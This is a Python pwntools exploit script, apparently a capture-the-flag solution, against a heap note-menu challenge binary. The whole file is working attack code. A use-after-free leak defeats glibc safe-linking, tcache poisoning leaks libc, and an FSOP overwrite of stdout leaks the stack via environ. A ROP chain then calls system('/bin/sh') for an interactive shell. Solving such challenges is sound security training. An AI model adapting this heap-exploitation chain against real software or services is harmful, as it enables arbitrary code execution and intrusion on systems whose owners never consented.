#!/usr/bin/env python3

from pwn import *

context.binary = exe = ELF("../challenge/chall")
libc = ELF("../src/libc.so.6")

def start():
    if args.GDB:
        io = gdb.debug([exe.path])
    elif args.REMOTE:
        io = remote("localhost", 2046)
    else:
        io = process([exe.path])

    return io

io = start()


def Allocate(Index, Size, Data):
    io.recvuntil(b"choice : ")
    io.sendline(b"0")
    io.recvuntil(b"Index : ")
    io.sendline(str(Index).encode())
    io.recvuntil(b"Size : ")
    io.sendline(str(Size).encode())
    io.recvuntil(b"Data : ") 
    io.send(Data)

def Free(Index):
    io.recvuntil(b"choice : ")
    io.sendline(b"1")
    io.recvuntil(b"Index : ")
    io.sendline(str(Index).encode())

def Print(Index):
    io.recvuntil(b"choice : ")
    io.sendline(b"2")
    io.recvuntil(b"Index : ")
    io.sendline(str(Index).encode())
    leak = io.recvuntil(b"0)").strip(b"0)")
    return leak.strip(b"\n")

def Edit(Index, Data):
    io.recvuntil(b"choice : ")
    io.sendline(b"3")
    io.recvuntil(b"Index : ")
    io.sendline(str(Index).encode())
    io.recvuntil(b"Data : ")
    io.send(Data)

def Safe_Link(P, L):
    P = p64(P)
    L = p64(L >> 12)
    ret = b""

    for i in range(len(L)):
        ret += (P[i] ^ L[i]).to_bytes(1, "little")

    return ret + b"\x00"*(8 - len(ret))



def main():
    # defeat Safe Linking 
    Allocate(0, 0x20, b"whatever")
    Free(0)
    print(Print(0))
    heap_leak = u64(Print(0) + b"\x00" * 3) << 12
    log.info(f"heap leak @ {hex(heap_leak)}")
    
    # leak libc
    Allocate(0, 0x20, b"AAAAAAAA")
    Allocate(1, 0x20, b"BBBBBBBB")
     
    # tcache_bin[0x20] : 0 -> 1
    Free(1)
    Free(0)
     
    Edit(0, Safe_Link(heap_leak + 0x2c0, heap_leak))
     
    Allocate(0, 0x20, b"A"*0x10 + p64(0) + p64(0x501))
    Allocate(1, 0x20, b"BBBBBBBB")
     
    Free(0)
     
    Allocate(0, 0x100, b"pad")
    Allocate(0, 0x100, b"pad")
    Allocate(0, 0x100, b"pad")
    Allocate(0, 0x100, b"pad")
    Allocate(0, 0x70,  b"pad")
     
    # avoid consolidation
    Allocate(0, 0x30, b"pad")
     
    Free(1)
    libc.address = u64(Print(1) + b"\x00\x00") - 0x219CE0
    log.info(f"libc leak @ {hex(libc.address)}")
     
    # leak stack
    Allocate(0, 0x100, b"AAAAAAAA")
    Allocate(1, 0x100, b"BBBBBBBB")
    
    Free(1)
    Free(0)
    
    Edit(0, Safe_Link(libc.sym["_IO_2_1_stdout_"], heap_leak))
    Allocate(0, 0x100, b"AAAAAAAA")
    
    # FSOP attack
    environ = libc.sym["environ"]
    payload = p64(0xfbad1800)  
    payload += p64(environ) * 3  
    payload += p64(environ)   
    payload += p64(environ + 0x8) * 2  
    payload += p64(environ + 8) 
    payload += p64(environ + 8) 
    Allocate(1, 0x100, payload)
    
    stack_leak = u64(io.recv(8))
    main_ret = stack_leak - 0x120
    print(f"environ leak @ {hex(stack_leak)}")
    print(f"saved rip leak @ {hex(main_ret)}")

    
    # build ROP
    Allocate(0, 0x100, b"AAAAAAAA")
    Allocate(1, 0x100, b"BBBBBBBB")

    Free(1)
    Free(0) 

    # -8 otherwise we will have a misaligned chunk which will lead to a SIGABRT
    Edit(0, Safe_Link(main_ret - 8, heap_leak))
   
    Allocate(0, 0x100, b"AAAAAAAA")

    POP_RDI = libc.address + 0x2a3e5

    Allocate(1, 0x100, p64(0xdeadbeefdeadbeef) + p64(POP_RDI) + p64(next(libc.search(b"/bin/sh"))) + p64(POP_RDI + 1) + p64(libc.sym["system"]))
    io.sendline(b"4")

    io.interactive()


if __name__ == "__main__":
    main()

